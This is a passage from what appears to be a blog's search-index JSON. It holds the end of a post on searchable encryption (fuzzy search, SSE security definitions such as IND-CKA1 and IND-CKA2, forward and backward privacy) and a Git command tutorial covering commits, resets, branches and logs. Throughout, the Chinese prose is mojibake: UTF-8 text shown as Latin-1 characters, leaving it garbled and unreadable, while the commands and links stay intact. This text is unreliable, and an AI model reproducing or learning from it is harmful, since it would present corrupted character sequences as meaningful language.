**â‘¡æ¨¡ç³Šæœç´¢**ï¼šæ—¨åœ¨æœç´¢çš„è¿‡ç¨‹ä¸­ï¼Œç”¨æˆ·è¾“å…¥çš„å…³é”®è¯ä¸æ•°æ®æˆ–ç´¢å¼•ä¸­å­˜åœ¨çš„å…³é”®è¯ä¹‹é—´å­˜åœ¨æŸç§æ¨¡ç³Šçš„å…³ç³»ï¼Œå¹¶ä»¥è¿™ç§æ¨¡ç³Šå…³ç³»è¿›è¡Œå…³é”®è¯åŒ¹é…ã€‚æ¨¡ç³Šæœç´¢åˆ†ä¸ºä»¥ä¸‹ä¸¤ç§æ¶æ„ï¼š\n  - ä½¿ç”¨ç¼–è¾‘è·ç¦»(edit distance)ï¼šåˆ©ç”¨é€šé…ç¬¦å’Œç¼–è¾‘è·ç¦»æ„é€ ä¸€ç»„ä¸åŸå§‹å…³é”®å­—ç›¸ä¼¼çš„æ¨¡ç³Šå…³é”®å­—ã€‚`ä¸æ”¯æŒå¤šå…³é”®å­—æ’åºæœç´¢ã€æœç´¢æ•ˆç‡ä½`\n  - ä½¿ç”¨å±€éƒ¨æ•æ„Ÿå“ˆå¸Œ(LSH)å’Œå¸ƒéš†è¿‡æ»¤å™¨(BF)ï¼šé€šè¿‡LSHä¸ºæ¯ä¸ªæ–‡ä»¶ç”ŸæˆBloomè¿‡æ»¤å™¨ã€‚`æœç´¢ç²¾åº¦æœ€å¤š87%`\n\n## SEç”¨é€”\n\n- â‘ å¤–åŒ…æ•°æ®åº“å­—æ®µåŠ å¯†\n- â‘¡äº‘è®¡ç®—ä¸­éšç§æ•°æ®çš„ä¿æŠ¤å’Œå…±äº«\n- â‘¢å¯†æ–‡ç›´æ¥æ“ä½œçš„ç›¸å…³åº”ç”¨\n\n## SEæ„é€ \n\n- **åŸºäºç´¢å¼•**ï¼šå¯¹äºæ¯ä¸€ä¸ªå…³é”®å­— Wï¼Œå»ºç«‹ä¸€ä¸ªç´¢å¼•ï¼Œç´¢å¼•ä¸­åŒ…å«æ‰€æœ‰å«æœ‰è¯¥å…³é”®å­—çš„æ–‡ä»¶çš„æŒ‡é’ˆã€‚ç”±äºè¿™ç§æ–¹æ¡ˆåœ¨æ›´æ–°æ•°æ®çš„æ—¶å€™ä¼šå¯¹ç´¢å¼•è¿›è¡Œå¤§é‡çš„ä¿®æ”¹ï¼Œå› æ­¤é€‚åˆå¤§é‡åªè¯»æ¨¡å¼ã€‚\n  - Z-IDXæ–¹æ¡ˆ\n  \n  - SSE-1æ–¹æ¡ˆ\n- **åŸºäºå­˜å‚¨ç»“æ„**ï¼šè¿™ç§æƒ…å†µä¸‹æ²¡æœ‰ç´¢å¼•ï¼Œæ¯æ¬¡æŸ¥è¯¢éƒ½æ˜¯å¯¹æ–‡ä»¶è¿›è¡Œä¸€æ¬¡æ‰«ææ¥å¯»æ‰¾ç¬¦åˆæŸ¥è¯¢æ¡ä»¶çš„æ–‡ä»¶ã€‚æ— ç–‘ï¼Œè¿™ç§æ¨¡å¼çš„æŸ¥è¯¢æ•ˆç‡ä¼šä½å¾ˆå¤šï¼Œä½†æ˜¯å´æ›´é€‚åˆç»å¸¸æ›´æ–°çš„å­˜å‚¨ç³»ç»Ÿã€‚\n  - SWPæ–¹æ¡ˆ\n\n## SEå†å²\n\n- 2000å¹´â€”â€”D.Songç­‰äºº**é¦–æ¬¡æå‡ºäº†SE**ï¼Œæœ‰æ•ˆåœ°è§£å†³äº†å¯¹åŠ å¯†æ•°æ®çš„æœç´¢é—®é¢˜ï¼Œä¿è¯äº†æ•°æ®\n  çš„éšç§ä¸è¢«æ³„éœ²ã€‚[è®ºæ–‡é“¾æ¥](http://ieeexplore.ieee.org/abstract/document/848445/)\n- 2010å¹´â€”â€”Jin Liç­‰äººæå‡ºäº†**ç¬¬ä¸€ä¸ªæ”¯æŒæ¨¡ç³Šå…³é”®è¯æœç´¢**çš„è§£å†³æ–¹æ¡ˆã€‚è¯¥æ–¹æ¡ˆä½¿ç”¨ç¼–è¾‘è·ç¦»æ¥è¡¨ç¤ºå…³é”®å­—çš„ç›¸å…³æ€§ï¼Œå¹¶åˆ©ç”¨é€šé…ç¬¦*æ¥æ„é€ æ¨¡ç³Šå…³é”®å­—é›†ã€‚[è®ºæ–‡é“¾æ¥](https://ieeexplore.ieee.org/abstract/document/5462196)\n- 2012å¹´â€”â€”Qi Chaiç­‰äºº**é¦–æ¬¡æå‡ºäº†**é‡‡ç”¨**åŸºäºæ ‘çš„ç´¢å¼•å’Œå“ˆå¸Œé“¾æŠ€æœ¯**å®ç°äº†**å¯éªŒè¯çš„SEæ–¹æ¡ˆ**ã€‚[è®ºæ–‡é“¾æ¥](https://ieeexplore.ieee.org/document/6364125)\n- 2014å¹´â€”â€”Bing Wangç­‰äººæå‡ºäº†**åˆ©ç”¨LSHå’ŒBFçš„ä½“ç³»ç»“æ„**æå‡ºäº†MFSE(åŠ å¯†æ•°æ®ä¸Šçš„å¤šå…³é”®å­—æ¨¡ç³Šæœç´¢)æ–¹æ¡ˆã€‚è¯¥æ–¹æ¡ˆå¯ä»¥åœ¨ä¸é¢„å…ˆå®šä¹‰æ¨¡ç³Šå…³é”®å­—é›†çš„æƒ…å†µä¸‹å¯¹è¿”å›çš„ç»“æœè¿›è¡Œæ’åºã€‚[è®ºæ–‡é“¾æ¥](https://ieeexplore.ieee.org/document/6848153)\n- ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚\n\n## SEæœªæ¥\n\næœªæ¥çš„å·¥ä½œè¿˜åº”è¯¥å…³æ³¨å¦‚ä½•åº”ç”¨SEçš„åŸºæœ¬æ€æƒ³æ¥å¤„ç†å…¶ä»–ç±»å‹çš„æ•°æ®ã€‚\n\nä¾‹å¦‚ï¼š\n\n- å¦‚ä½•æœç´¢åŒ…å«å›¾åƒæ•°æ®æˆ–è§†é¢‘æ•°æ®çš„åŠ å¯†åª’ä½“æ•°æ®ï¼›\n- å¦‚ä½•æœç´¢åŒ…å«å…³ç³»æ•°æ®åº“æˆ–éå…³ç³»æ•°æ®åº“çš„åŠ å¯†æ•°æ®åº“ï¼›\n- å¦‚ä½•æœç´¢ç»“æ„åŒ–çš„ç¤¾äº¤ç½‘ç»œæ•°æ®ï¼ˆç©ºé—´æ•°æ®ï¼‰ã€‚\n\n\n\n## SSEå®‰å…¨æ€§\n\nå½“SSEæ–¹æ¡ˆæ˜¯å®‰å…¨çš„ï¼š\n\nï¼ˆ1ï¼‰ä»…å¯†æ–‡ä¸æ­ç¤ºå…³äºæ•°æ®çš„ä»»ä½•ä¿¡æ¯ï¼›\n\nï¼ˆ2ï¼‰å¯†æ–‡ä¸æœç´¢ä»¤ç‰Œä¸€èµ·æœ€å¤šæ­ç¤ºäº†æœç´¢çš„ç»“æœï¼›\n\nï¼ˆ3ï¼‰åªèƒ½ä½¿ç”¨å¯†é’¥ç”Ÿæˆæœç´¢ä»¤ç‰Œã€‚\n\næœåŠ¡å™¨å¯ä»¥äº†è§£åˆ°ä¸€äº›å…³äºå®¢æˆ·ç«¯æŸ¥è¯¢çš„æœ‰é™ä¿¡æ¯ã€‚ä¾‹å¦‚å®ƒçŸ¥é“æ­£åœ¨æœç´¢çš„å…³é”®å­—éƒ½åŒ…å«åœ¨åŠ å¯†ä¸º$c_{w}$ çš„æ–‡ä»¶ä¸­ã€‚\n\n> KPA < IND-SCKA < IND-CKA1 < IND-CKA2\n\n**KPA**\n\n- Known Plaintext Attack\n\n- çŸ¥é“éƒ¨åˆ†çš„æ˜æ–‡å’Œå¯†æ–‡å¯¹ï¼Œæ¨å‡ºå¯†é’¥å’ŒåŠ å¯†ç®—æ³•\n\n**SCKA**\n\n- selectivelychosen-keyword attack\n\n- é€‰æ‹©æ€§å…³é”®å­—æ”»å‡»\n\n- å®ƒä¸èƒ½ä¿è¯è°“è¯çš„ç§å¯†æ€§ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥é€šè¿‡ç”Ÿæˆä»»æ„çš„æ˜æ–‡-å¯†æ–‡ç´¢å¼•å¯¹ ä»é™·é—¨ä¸­æ¨æ–­å‡ºæŸ¥è¯¢å…³é”®å­—ã€‚\n\n**IND-CKA1** \n\n- indistinguishability against chosen keyword attack\n- é’ˆå¯¹é€‰æ‹©å…³é”®å­—æ”»å‡»çš„ä¸å¯åŒºåˆ†æ€§\n- ä¿è¯æ–‡æ¡£å†…å®¹ä¸ä¼šè¢«å»ºç«‹åœ¨å…¶ä¸Šçš„ç´¢å¼•ä»¥åŠå…¶ä»–æ–‡æ¡£çš„ç´¢å¼•æ³„æ¼\n- ç„¶è€Œï¼Œåœ¨[å¯æœç´¢çš„å¯¹ç§°åŠ å¯†ï¼šæ”¹è¿›çš„å®šä¹‰å’Œé«˜æ•ˆçš„ç»“æ„](https://dl.acm.org/doi/abs/10.5555/2590701.2590705)ä¸­æå‡ºåˆ°ï¼Œåªæœ‰å½“æœç´¢æŸ¥è¯¢ç‹¬ç«‹äº $(\\gamma, c)$ å’Œå…ˆå‰çš„æœç´¢ç»“æœæ—¶ï¼ŒCKA1 æ‰æä¾›å®‰å…¨æ€§ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæå‡ºäº†æ›´å¼ºçš„**CKA2**ã€‚\n- åªæœ‰å½“å®¢æˆ·çš„æŸ¥è¯¢ç‹¬ç«‹äºç´¢å¼•å’Œå…ˆå‰çš„ç»“æœæ—¶ï¼ŒCKA1æ‰èƒ½ä¿è¯å®‰å…¨æ€§ã€‚\n\nIND-CKA2\n\n- adaptively chosen-keyword attack\n- è‡ªé€‚åº”é€‰æ‹©å…³é”®å­—æ”»å‡»\n- è‡ªé€‚åº”æ”»å‡»æ¨¡å‹ä¸‹æ»¡è¶³æŠµæŠ—é€‰æ‹©æ€§æ˜æ–‡æ”»å‡»çš„å®‰å…¨ä¸ºCKA2\n\n- å¯¹æ‰‹æ ¹æ®å…ˆå‰é€‰æ‹©çš„æŸ¥è¯¢åŠå…¶é™·é—¨å’Œæœç´¢ç»“æœè‡ªé€‚åº”åœ°é€‰æ‹©æœªæ¥çš„æ¯ä¸ªæŸ¥è¯¢ã€‚å¦‚æœæ²¡æœ‰æ¦‚ç‡å¤šé¡¹å¼æ—¶é—´ï¼ˆPPTï¼‰å¯¹æ‰‹èƒ½å¤Ÿä»¥ä¸å¯å¿½ç•¥çš„ä¼˜åŠ¿åŒºåˆ†çœŸå®é¡¹ç›®å’Œæ¨¡æ‹Ÿé¡¹ç›®ï¼Œåˆ™è¯¥æ–¹æ¡ˆæ˜¯è‡ªé€‚åº”å®‰å…¨çš„ï¼Œè¿™æ˜¯è¿„ä»Šä¸ºæ­¢åŸºäºSSEçš„å…³é”®å­—æœç´¢æœ€å¼ºå¤§çš„å®‰å…¨æ¨¡å‹ã€‚\n\n- å³ä½¿å®¢æˆ·ç«¯çš„æŸ¥è¯¢æ˜¯åŸºäºåŠ å¯†çš„ç´¢å¼•å’Œå…ˆå‰æŸ¥è¯¢çš„ç»“æœï¼ŒCKA2ä¹Ÿèƒ½ä¿è¯å®‰å…¨æ€§ã€‚\n\nUC-Secure\n\n- æœ€è¿‘ï¼ŒKurosawaå’ŒOhtakiæå‡ºäº†æ›´å¼ºçš„é€šç”¨å¯ç»„åˆ[How to Construct UC-Secure Searchable Symmetric Encryption Scheme](https://eprint.iacr.org/2015/251)ï¼ˆUC-Secureï¼‰SSEæ¦‚å¿µã€‚ç²—ç•¥åœ°è¯´ï¼Œå³ä½¿åœ¨ä»»æ„ç¯å¢ƒä¸­ä½¿ç”¨è¯¥æ–¹æ¡ˆæ—¶ï¼Œä¹Ÿèƒ½ä¿è¯å®‰å…¨æ€§ã€‚\n\n\n\nå‚è€ƒï¼šåœ¨ [å¯æœç´¢çš„å¯¹ç§°åŠ å¯†ï¼šæ”¹è¿›çš„å®šä¹‰å’Œæœ‰æ•ˆçš„æ„é€ ](https://dl.acm.org/doi/abs/10.1145/1180405.1180417?casa_token=9_Hd9p-Sz3sAAAAA:exvY5ztMhWxLalHYBWhqHRZ_Rf54MMJf17PV5mgJMnGNDWtQNBlPD6jP34jUEyojdSFXAer7F23u) ä¸­ï¼ŒCurtmola ç­‰äººã€‚ä¸ºå¯æœç´¢çš„åŠ å¯†æ–¹æ¡ˆæå‡ºéè‡ªé€‚åº”å’Œè‡ªé€‚åº”ï¼ˆä¸å¯åŒºåˆ†æ€§å’ŒåŸºäºæ¨¡æ‹Ÿå™¨ï¼‰çš„å®‰å…¨å®šä¹‰ï¼Œé€šå¸¸ç§°ä¸ºIND-CKA1 å’ŒIND-CKA2ã€‚\n\n\n\nä»Šå¹´æ¥å…³äºå¯¹ç§°å¯æœæœåŠ å¯†çš„ç ”ç©¶ä¸»è¦é›†ä¸­äºå¯¹äºåŠ¨æ€å¯æœç´¢åŠ å¯†ä¸­çš„å‰å‘å®‰å…¨å’Œåå‘å®‰å…¨ã€‚\n\nå‰å‘å®‰å…¨æŒ‡çš„æ˜¯ï¼šåœ¨æ’å…¥æ–°çš„æ–‡ä»¶åï¼Œä¹‹å‰çš„æœç´¢ä¸èƒ½åŒ¹é…åˆ°æ–°æ·»åŠ çš„æ–‡ä»¶ã€‚\n\nåå‘å®‰å…¨æŒ‡çš„æ˜¯ï¼šæ’å…¥åœ¨åˆ é™¤æ–‡ä»¶åï¼Œæœç´¢ä¸ä¼šæš´æ¼è¯¥æ–‡ä»¶çš„æ ‡è¯†ã€‚\n\n\n\n å‰å‘éšç§ï¼ˆForward privacyï¼‰å’Œåå‘éšç§(Backward privacy)æ˜¯DSSEï¼ˆDynamic Searchable Symmetric Encryptionï¼‰çš„ä¸¤ä¸ªåŸºæœ¬å±æ€§ï¼Œæ—¨åœ¨æ§åˆ¶åŠ¨æ€æ–¹æ¡ˆä¸­æ›´æ–°æ“ä½œé€ æˆçš„ä¿¡æ¯æ³„éœ²ã€‚\n\nå‰å‘éšç§ï¼šæœåŠ¡å™¨æ— æ³•å°†å½“å‰æ·»åŠ çš„å…³é”®å­—ä¸ä¹‹å‰æœç´¢çš„ç»“æœç›¸å…³è”ã€‚å³æœåŠ¡å™¨ä¸çŸ¥é“å½“å‰æ·»åŠ çš„å…³é”®å­—æ˜¯å¦ä¹‹å‰æœç´¢è¿‡ã€‚ï¼ˆå…ˆæœç´¢åæ›´æ–°ï¼‰ã€‚\n\nåå‘éšç§ï¼šæœåŠ¡å™¨æ— æ³•å°†å½“å‰æœç´¢çš„å…³é”®å­—ä¸ä¹‹å‰çš„æ›´æ–°ç›¸å…³è”ã€‚å³æœåŠ¡å™¨ä¸çŸ¥é“æ›´æ–°ï¼ˆæ·»åŠ æˆ–åˆ é™¤ï¼‰å†å²ï¼ˆå…ˆæ›´æ–°åæœç´¢ï¼‰ã€‚\n\n\n\n\n\n\n\n## Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœä½ è§‰å¾—æœ¬æ–‡å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥è¯·æˆ‘å–ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["å¯æœç´¢åŠ å¯†"],"categories":["Crypto"]},{"title":"ç‰ˆæœ¬ç®¡ç†-Git","url":"/posts/3232.html","content":"\nä¸€ç›´åªä¼šå¸¸ç”¨çš„é‚£å‡ ä¸ª Git å‘½ä»¤ï¼Œæ¯æ¬¡é‡åˆ°ä¸ä¼šçš„æ“ä½œéƒ½æ˜¯ç°å»Googleï¼Œååˆ†ä¸æ–¹ä¾¿ï¼Œä»Šä¸ªå¾—ç©ºå’‹å°±ä»”ä»”ç»†ç»†çš„å­¦ä¹ å­¦ä¹  Git ï¼\n\n## Gitç®€ä»‹\n\n> Gitæ˜¯ç›®å‰ä¸–ç•Œä¸Šæœ€å…ˆè¿›çš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿã€‚\n\n### å·¥ä½œæµç¨‹\n\n![å·¥ä½œæµç¨‹](https://img.jwt1399.top/img/git.png)\n\n- **å·¥ä½œåŒºï¼š**ä½ åœ¨ç”µè„‘é‡Œèƒ½çœ‹åˆ°çš„ç›®å½•ã€‚\n\n- **æš‚å­˜åŒºï¼š**å‡†å¤‡è¿›è¡Œç‰ˆæœ¬ä¿å­˜çš„æ–‡ä»¶åˆ—è¡¨ã€‚\n- **æœ¬åœ°ä»“åº“ï¼š**å®Œæˆç‰ˆæœ¬ä¿å­˜çš„æ–‡ä»¶åˆ—è¡¨ã€‚\n- **è¿œç¨‹ä»“åº“ï¼š**ä¾‹å¦‚ï¼šè‡ªå·±çš„GitHubä»“åº“ã€ç äº‘ä»“åº“ã€‚\n- **æäº¤æµç¨‹ä¸ºï¼š**å·¥ä½œåŒºâ¤æš‚å­˜åŒºâ¤æœ¬åœ°ä»“åº“â¤è¿œç¨‹ä»“åº“\n\n### ä¸“æœ‰åè¯\n\n- masterï¼šé»˜è®¤å¼€å‘åˆ†æ”¯ï¼ˆæœ€æ–°ç‰ˆæœ¬çš„åå­—ï¼‰\n- originï¼šç»™è¿œç¨‹ä»“åº“åœ°å€èµ·åˆ«åçš„å¸¸ç”¨åå­—ï¼ˆhttpæ–¹å¼ï¼‰\n- origin_sshï¼šç»™è¿œç¨‹ä»“åº“åœ°å€èµ·åˆ«åçš„å¸¸ç”¨åå­—ï¼ˆsshå…å¯†æ–¹å¼ï¼‰\n- HEADï¼šå½“å‰æ‰€åœ¨çš„ç‰ˆæœ¬ï¼ˆåœ¨åˆ†æ”¯æ“ä½œæ—¶ï¼Œä¹Ÿå«æ²¡æœ‰å‘½åçš„åˆ†æ”¯ï¼‰\n- HEAD^ ï¼šä¸Šä¸€ä¸ªç‰ˆæœ¬\n- HEAD^^ ï¼šä¸Šä¸Šä¸ªç‰ˆæœ¬\n- HEAD~nï¼šå‰nä¸ªç‰ˆæœ¬\n\n## é…ç½®ç”¨æˆ·ä¿¡æ¯\n\n### å…¨å±€é…ç½®\n\n```bash\ngit config --global user.name \"Your Name\"\ngit config --global user.email \"email@example.com\"\n```\n\n### å•ç‹¬é…ç½®\n\n```bash\n#å¯¹æŸä¸ªé¡¹ç›®æƒ³å•ç‹¬é…ç½®ä¿¡æ¯å¯ä»¥ä½¿ç”¨\ngit config user.name \"Your Name\" \ngit config user.email \"email@example.com\"\n```\n\n### æŸ¥çœ‹é…ç½®\n\n```bash\ngit config --global user.name #æŸ¥çœ‹é…ç½®çš„å…¨å±€åå­—\ngit config --global user.email #æŸ¥çœ‹é…ç½®çš„å…¨å±€é‚®ç®±åœ°å€\ngit config --list #æŸ¥çœ‹å½“å‰é¡¹ç›®çš„gité…ç½®ä¿¡æ¯ï¼ˆä¼šå…ˆåˆ—å‡ºå…¨å±€é…ç½®ï¼Œæœ€ä¸‹é¢åˆ—å‡ºçš„æ˜¯å½“å‰é¡¹ç›®çš„é…ç½®ï¼‰æ•´é¡µç¿»é¡µ ctrl-f(å¾€å‰ç¿») ctrl-b(å¾€åç¿»)\n```\n\n## ä»“åº“çš„åˆ›å»ºä¸æäº¤\n\n### åˆ›å»ºä»“åº“\n\n```bash\ngit init\n```\n\n### æäº¤æ–‡ä»¶\n\n```bash\n#ç¬¬ä¸€æ­¥ï¼šæŠŠæ–‡ä»¶æ·»åŠ åˆ°æš‚å­˜åŒº\ngit add <file> #æ·»åŠ å•ä¸ªæ–‡ä»¶\ngit add .      #æ·»åŠ æ‰€æœ‰æ–‡ä»¶\n\n#ç¬¬äºŒæ­¥ï¼ŒæŠŠæš‚å­˜åŒºæ–‡ä»¶æäº¤åˆ°æœ¬åœ°ä»“åº“\ngit commit -m <message>\n```\n\nä¾‹å­ï¼šæ–°å»ºlearngitæ–‡ä»¶å¤¹ï¼Œå¹¶å°†è¯¥æ–‡ä»¶å¤¹åˆå§‹åŒ–ä¸ºGitä»“åº“ï¼Œå†å‘ä»“åº“ä¸­æ·»åŠ ä¸€ä¸ªtest.txtæ–‡ä»¶\n\n```bash\nmkdir learngit\ncd learngit\ngit init\n\nvim test.txt\ngit add test.txt\ngit commit -m \"add a test file\"\n```\n\n## ç‰ˆæœ¬å›é€€ï¼ˆå›åˆ°è¿‡å»ï¼‰\n\n### è½¯å›é€€\n\nå°†å½“å‰åˆ†â½€å›æ»šåˆ°æŒ‡å®šç‰ˆæœ¬ï¼Œä¿æŒâ¼¯ä½œåŒºå’Œæš‚å­˜åŒºçŠ¶æ€ä¸å˜ã€‚\n\n```bash\ngit reset --soft HEAD^  #å›é€€åˆ°ä¸Šä¸€ä¸ªç‰ˆæœ¬\n\ngit reset --soft HEAD~n #å›é€€åˆ°å‰nä¸ªç‰ˆæœ¬\n\ngit reset --soft <commit id> #å›é€€åˆ°æŒ‡å®šç‰ˆæœ¬,idå¯é€šè¿‡git logæŸ¥çœ‹\n```\n\n### æ··åˆå›é€€\n\nå°†å½“å‰åˆ†â½€å›æ»šåˆ°æŒ‡å®šç‰ˆæœ¬ï¼Œæ¸…é™¤æš‚å­˜åŒºçš„ä¿®æ”¹ï¼Œä½†ä¿æŒâ¼¯ä½œåŒºçŠ¶æ€ä¸å˜ã€‚\n\n```bash\ngit reset HEAD^  #å›é€€åˆ°ä¸Šä¸€ä¸ªç‰ˆæœ¬\n\ngit reset HEAD~n #å›é€€åˆ°å‰nä¸ªç‰ˆæœ¬\n\ngit reset  <commit id> #å›é€€åˆ°æŒ‡å®šç‰ˆæœ¬,idå¯é€šè¿‡git logæŸ¥çœ‹\n```\n\n### å¼ºåˆ¶å›é€€\n\nå°†å½“å‰åˆ†â½€å›æ»šåˆ°æŒ‡å®šç‰ˆæœ¬ï¼Œæ¸…é™¤æš‚å­˜åŒºçš„ä¿®æ”¹ï¼Œå¹¶å¼ºåˆ¶åˆ é™¤æ‰€æœ‰â¼¯ä½œåŒºçš„ä¿®æ”¹\n\n```bash\ngit reset --hard HEAD^  #å›é€€åˆ°ä¸Šä¸€ä¸ªç‰ˆæœ¬\n\ngit reset --hard HEAD~n #å›é€€åˆ°å‰nä¸ªç‰ˆæœ¬\n\ngit reset --hard <commit id> #å›é€€åˆ°æŒ‡å®šç‰ˆæœ¬,idå¯é€šè¿‡git logæŸ¥çœ‹\n```\n\n## å›é€€å–æ¶ˆï¼ˆé‡è¿”æœªæ¥ï¼‰\n\nç°åœ¨ï¼Œä½ å›é€€åˆ°äº†æŸä¸ªç‰ˆæœ¬ï¼Œå…³æ‰äº†ç”µè„‘(æ— æ³•ä½¿ç”¨git log æŸ¥çœ‹åˆ°å›é€€å‰çš„commit id)ï¼Œç¬¬äºŒå¤©æ—©ä¸Šå°±åæ‚”äº†ï¼Œæƒ³æ¢å¤åˆ°å›é€€å‰çš„ç‰ˆæœ¬æ€ä¹ˆåŠï¼Ÿä½†æ˜¯æ‰¾ä¸åˆ°å›é€€å‰ç‰ˆæœ¬çš„`commit id`æ€ä¹ˆåŠï¼Ÿ\n\n```bash\ngit reflog #æŸ¥çœ‹æ‰€æœ‰çš„å†å²å‘½ä»¤ï¼Œè·å–ä½ æƒ³è¦å›åˆ°çš„ç‰ˆæœ¬idï¼Œ\n\ngit reset --hard <commit id> #å›é€€åˆ°è¯¥ç‰ˆæœ¬\n```\n\n## åˆ†æ”¯ç®¡ç†ï¼ˆå¹³è¡Œå®‡å®™ï¼‰\n\n### åˆ†æ”¯ç®€ä»‹\n\nGitç”¨`master`æŒ‡å‘æœ€æ–°çš„æäº¤ï¼Œå†ç”¨`HEAD`æŒ‡å‘`master`ï¼Œå°±èƒ½ç¡®å®šå½“å‰åˆ†æ”¯ï¼Œä»¥åŠå½“å‰åˆ†æ”¯çš„æäº¤ç‚¹\n\n![åˆå§‹åˆ†æ”¯](https://img.jwt1399.top/img/0.png)\n\nGitæ–°å»ºä¸€ä¸ªæŒ‡é’ˆå«`dev`ï¼ŒæŒ‡å‘`master`ç›¸åŒçš„æäº¤ï¼Œå†æŠŠ`HEAD`æŒ‡å‘`dev`ï¼Œå°±è¡¨ç¤ºå½“å‰åˆ†æ”¯åœ¨`dev`ä¸Š\n\n![æ–°å»ºåˆ†æ”¯](https://img.jwt1399.top/img/l.png)\n\nå¯¹å·¥ä½œåŒºçš„ä¿®æ”¹å’Œæäº¤å°±æ˜¯é’ˆå¯¹`dev`åˆ†æ”¯äº†ï¼Œæ¯”å¦‚æ–°æäº¤ä¸€æ¬¡åï¼Œ`dev`æŒ‡é’ˆå¾€å‰ç§»åŠ¨ä¸€æ­¥ï¼Œè€Œ`master`æŒ‡é’ˆä¸å˜\n\n![æ–°åˆ†æ”¯å¼€å‘](https://img.jwt1399.top/img/l-20220107134257366.png)\n\nå‡å¦‚æˆ‘ä»¬åœ¨`dev`ä¸Šçš„å·¥ä½œå®Œæˆäº†ï¼Œå°±å¯ä»¥æŠŠ`dev`åˆå¹¶åˆ°`master`ä¸Šã€‚å°±æ˜¯ç›´æ¥æŠŠ`master`æŒ‡å‘`dev`çš„å½“å‰æäº¤ï¼Œå°±å®Œæˆäº†åˆå¹¶\n\n![åˆå¹¶åˆ†æ”¯](https://img.jwt1399.top/img/0-20220107134527384.png)\n\nåˆå¹¶å®Œåˆ†æ”¯åï¼Œç”šè‡³å¯ä»¥åˆ é™¤`dev`åˆ†æ”¯ã€‚åˆ é™¤`dev`åˆ†æ”¯å°±æ˜¯æŠŠ`dev`æŒ‡é’ˆç»™åˆ æ‰ï¼Œåˆ æ‰åï¼Œæˆ‘ä»¬å°±å‰©ä¸‹äº†ä¸€æ¡`master`åˆ†æ”¯\n\n![åˆ é™¤åˆ†æ”¯](https://img.jwt1399.top/img/0-20220107134635390.png)\n\n### åˆ›å»ºåˆ†æ”¯\n\n```bash\ngit branch [branch_name]\n```\n\n### \tåˆ‡æ¢åˆ†æ”¯\n\n```bash\ngit checkout [branch_name]\n\ngit switch [branch_name]\n```\n\n### åˆ›å»ºå¹¶åˆ‡æ¢\n\n```bash\ngit checkout -b [branch_name]\n\ngit switch -c [branch_name]\n```\n\n### åˆå¹¶åˆ†æ”¯\n\n```bash\ngit merge [branch_name] #ç”¨äºåˆå¹¶æŒ‡å®šåˆ†æ”¯åˆ°å½“å‰åˆ†æ”¯\n```\n\n### åˆ é™¤åˆ†æ”¯\n\n```bash\ngit branch -d [branch_name]\n```\n\n### æŸ¥çœ‹åˆ†æ”¯\n\n```bash\ngit branch -vv #æŸ¥çœ‹å½“å‰å¼€å‘åˆ†æ”¯(å½“å‰åˆ†æ”¯å‰é¢ä¼šæ ‡ä¸€ä¸ª*å·)\ngit branch #æŸ¥çœ‹æœ¬åœ°æ‰€æœ‰åˆ†æ”¯\ngit branch -r #æŸ¥çœ‹è¿œç¨‹æ‰€æœ‰åˆ†æ”¯\ngit branch -a #æŸ¥çœ‹æœ¬åœ°å’Œè¿œç¨‹æ‰€æœ‰åˆ†æ”¯\n```\n\n## æŸ¥çœ‹æäº¤å†å²\n\n```bash\ngit log  #æŸ¥çœ‹å†å²æäº¤è®°å½•\ngit log --pretty=oneline #æŸ¥çœ‹ç®€æ´ç‰ˆå†å²æäº¤è®°å½•\ngit log --graph #æŸ¥çœ‹å†å²æäº¤è®°å½•æ‹“æ‰‘å›¾\ngit log -p <file> #æŒ‡å®šæ–‡ä»¶çš„å†å²æäº¤è®°å½•\ngit blame <file> #æŸ¥çœ‹æŒ‡å®šæ–‡ä»¶çš„å†å²ä¿®æ”¹è®°å½•\n```\n\næ›´å¤š git log å‘½ä»¤å¯æŸ¥çœ‹ï¼šhttp://git-scm.com/docs/git-log\n\n## ä¸€äº›å¸¸ç”¨å‘½ä»¤\n\n```bash\ngit status  #æŸ¥çœ‹é¡¹ç›®æ–‡ä»¶æ­¤æ—¶çš„çŠ¶æ€ï¼ˆåœ¨å·¥ä½œåŒºã€ç¼“å­˜åŒºè¿˜æ˜¯åœ¨ä»“åº“ä¸­ï¼‰\n\ngit reflog #æŸ¥çœ‹æ‰€æœ‰çš„å†å²å‘½ä»¤\n\ngit remote -v #æŸ¥çœ‹è¿œç¨‹ä»“åº“åœ°å€\n\ngit diff #â½è¾ƒâ¼¯ä½œåŒºå’Œæš‚å­˜åŒºçš„ä¿®æ”¹\n\ngit diff HEAD #â½è¾ƒâ¼¯ä½œåŒºå’Œä¸Šâ¼€æ¬¡commitåçš„ä¿®æ”¹ã€‚ \n\ngit diff --cached #â½è¾ƒæš‚å­˜åŒºå’Œä¸Šâ¼€æ¬¡commitåçš„ä¿®æ”¹ã€‚\n```\n\n## SourceTree\n\n> ä¸€æ¬¾ç”¨äºWindowså’ŒMacçš„å…è´¹Gitå¯è§†åŒ–ç®¡ç†å·¥å…·ã€‚\n\nè¯¦ç»†ç”¨æ³•å¯å‚è€ƒï¼š\n\n[gitçš„GUIå·¥å…·Sourcetreeä½¿ç”¨åŠå‘½ä»¤è¡Œå¯¹æ¯”](https://juejin.cn/post/6844903639404773383)\n\n[Git/SourceTreeç‰ˆæœ¬ç®¡ç†_bilibili](https://www.bilibili.com/video/BV1Ev411j7e5?p=1)\n\n## Reference\n\n- [gitå‘½ä»¤ä¸Sourcetreeä½¿ç”¨ ](https://www.cnblogs.com/Lencamo/p/15304086.html)\n- 